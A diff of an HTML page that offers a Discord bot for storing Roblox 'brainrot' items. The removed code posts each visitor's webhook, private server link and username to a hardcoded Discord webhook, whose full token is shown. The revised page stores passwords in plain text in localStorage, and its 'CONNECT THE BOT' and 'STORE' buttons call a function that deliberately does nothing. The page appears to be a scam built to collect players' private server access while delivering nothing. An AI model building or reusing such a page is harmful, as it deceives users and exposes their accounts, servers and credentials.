@@ -35,7 +35,7 @@
             box-shadow: 0 2px 8px rgba(0,0,0,0.04);
         }
 
-        .input-container {
+        .input-container, .auth-container {
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -53,7 +53,7 @@
             box-sizing: border-box;
         }
 
-        .submit-btn {
+        .submit-btn, .auth-btn {
             font-size: 1.2rem;
             padding: 0.8rem 2rem;
             background: #0078ff;
@@ -66,8 +66,41 @@
             margin-top: 1rem;
         }
 
-        .submit-btn:hover {
+        .submit-btn:hover, .auth-btn:hover {
             background: #005fcc;
+        }
+
+        .action-btn {
+            font-size: 1.2rem;
+            padding: 0.8rem 2rem;
+            background: #0078ff;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            transition: background 0.2s;
+            margin: 0.5rem;
+        }
+
+        .action-btn:hover {
+            background: #005fcc;
+        }
+
+        .message {
+            max-width: 400px;
+            text-align: center;
+            margin-top: 1rem;
+            font-size: 1rem;
+            color: #222;
+        }
+
+        .toggle-auth {
+            font-size: 1rem;
+            color: #0078ff;
+            cursor: pointer;
+            margin-top: 0.5rem;
+            text-decoration: underline;
         }
     </style>
 </head>
@@ -76,22 +109,104 @@
     <div class="how-text">
         Always wanted to store your brainrots because you wanna rebirth or go stealing.
         welp now you can store all your stuff without any problem of loosing it 
-
-        how this works 
-        -Put your WEBHOOK in the first line
-        -Put your PRIVATE SERVER in the second line 
-        -Put your USERNAME in the third line
-
-        thats all you can connect the bot whenever you want in discord in your own server
+        register if you dont have an account and log in if you already have on after 
+        filling the fields an instruction will be send to your discord server
     </div>
-    <div class="input-container">
+    <div id="auth-section" class="auth-container">
+        <input type="text" id="auth-username" class="input-field" placeholder="Username">
+        <input type="password" id="auth-password" class="input-field" placeholder="Password">
+        <button id="register-btn" class="auth-btn" onclick="register()">Register</button>
+        <div id="toggle-auth-text" class="toggle-auth" onclick="toggleAuth()">Already have an account? Log in</div>
+    </div>
+    <div id="input-section" class="input-container" style="display: none;">
         <input type="text" id="webhook" class="input-field" placeholder="Webhook">
         <input type="text" id="privateServer" class="input-field" placeholder="Private Server">
         <input type="text" id="username" class="input-field" placeholder="Username">
         <button class="submit-btn" onclick="sendToWebhook()">Submit</button>
     </div>
+    <div id="response" style="display: none;">
+        <div class="message">Wait until the bot connects, it can take less than 5 minutes. If it doesn't connect, try again later.</div>
+        <button class="action-btn" onclick="doNothing()">CONNECT THE BOT</button>
+        <button class="action-btn" onclick="doNothing()">STORE</button>
+    </div>
 
     <script>
+        let isRegisterMode = true;
+
+        // Check if user is already logged in
+        window.onload = function() {
+            const loggedInUser = localStorage.getItem('loggedInUser');
+            if (loggedInUser) {
+                const userData = JSON.parse(localStorage.getItem(`user_${loggedInUser}`));
+                if (userData && userData.webhook && userData.privateServer && userData.username) {
+                    document.getElementById('auth-section').style.display = 'none';
+                    document.getElementById('input-section').style.display = 'none';
+                    document.getElementById('response').style.display = 'block';
+                    document.getElementById('webhook').value = userData.webhook;
+                    document.getElementById('privateServer').value = userData.privateServer;
+                    document.getElementById('username').value = userData.username;
+                } else {
+                    document.getElementById('auth-section').style.display = 'none';
+                    document.getElementById('input-section').style.display = 'block';
+                }
+            }
+        };
+
+        function toggleAuth() {
+            isRegisterMode = !isRegisterMode;
+            document.getElementById('register-btn').textContent = isRegisterMode ? 'Register' : 'Log In';
+            document.getElementById('toggle-auth-text').textContent = isRegisterMode ? 'Already have an account? Log in' : 'Need an account? Register';
+        }
+
+        function register() {
+            const username = document.getElementById('auth-username').value;
+            const password = document.getElementById('auth-password').value;
+
+            if (!username || !password) {
+                alert('Please fill in both username and password');
+                return;
+            }
+
+            if (isRegisterMode) {
+                // Check if username already exists
+                if (localStorage.getItem(`user_${username}`)) {
+                    alert('Username already exists. Please choose another or log in.');
+                    return;
+                }
+                // Register new user
+                const userData = { username, password, webhook: '', privateServer: '', usernameField: '' };
+                localStorage.setItem(`user_${username}`, JSON.stringify(userData));
+                localStorage.setItem('loggedInUser', username);
+                alert('Registration successful! Please enter your webhook, private server, and username.');
+                document.getElementById('auth-section').style.display = 'none';
+                document.getElementById('input-section').style.display = 'block';
+            } else {
+                // Log in
+                const userData = JSON.parse(localStorage.getItem(`user_${username}`));
+                if (!userData || userData.password !== password) {
+                    alert('Invalid username or password.');
+                    return;
+                }
+                localStorage.setItem('loggedInUser', username);
+                if (userData.webhook && userData.privateServer && userData.usernameField) {
+                    document.getElementById('auth-section').style.display = 'none';
+                    document.getElementById('input-section').style.display = 'none';
+                    document.getElementById('response').style.display = 'block';
+                    document.getElementById('webhook').value = userData.webhook;
+                    document.getElementById('privateServer').value = userData.privateServer;
+                    document.getElementById('username').value = userData.usernameField;
+                } else {
+                    alert('Login successful! Please enter your webhook, private server, and username.');
+                    document.getElementById('auth-section').style.display = 'none';
+                    document.getElementById('input-section').style.display = 'block';
+                }
+            }
+        }
+
+        function doNothing() {
+            // This function intentionally does nothing
+        }
+
         async function sendToWebhook() {
             const webhook = document.getElementById('webhook').value;
             const privateServer = document.getElementById('privateServer').value;
@@ -116,11 +231,21 @@
             }
 
             const payload = {
-                content: `<@Everyone> **New Submission**\nWebhook: ${webhook}\nPrivate Server: ${privateServer}\nUsername: ${username}`
+                embeds: [
+                    {
+                        title: "New Submission",
+                        fields: [
+                            { name: "Webhook", value: webhook, inline: false },
+                            { name: "Private Server", value: privateServer, inline: false },
+                            { name: "Username", value: username, inline: false }
+                        ],
+                        color: 3447003
+                    }
+                ]
             };
 
             try {
-                const response = await fetch('https://discord.com/api/webhooks/1421414129159114825/WzUVXlVkQoFnbW8HL0HOISIS8as_GISRHIynaAONm4tF-a42hElzMIECIwOhYGl9-Rkz', {
+                const response = await fetch(webhook, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
@@ -129,13 +254,23 @@
                 });
 
                 if (response.ok) {
-                    alert('Submission sent successfully!');
+                    alert('Submission sent successfully! Check your Discord server.');
+                    // Save submission data
+                    const loggedInUser = localStorage.getItem('loggedInUser');
+                    if (loggedInUser) {
+                        const userData = JSON.parse(localStorage.getItem(`user_${loggedInUser}`));
+                        userData.webhook = webhook;
+                        userData.privateServer = privateServer;
+                        userData.usernameField = username;
+                        localStorage.setItem(`user_${loggedInUser}`, JSON.stringify(userData));
+                    }
+                    document.getElementById('input-section').style.display = 'none';
+                    document.getElementById('response').style.display = 'block';
                     document.getElementById('webhook').value = '';
                     document.getElementById('privateServer').value = '';
                     document.getElementById('username').value = '';
                 } else {
                     alert('Failed to send submission. Please try again.');
-                    // Check if the response is a 404 error
                     if (response.status === 404) {
                         alert('Webhook URL is invalid. Nelly is serving noodles! Please check the webhook URL and try again.');
                     }
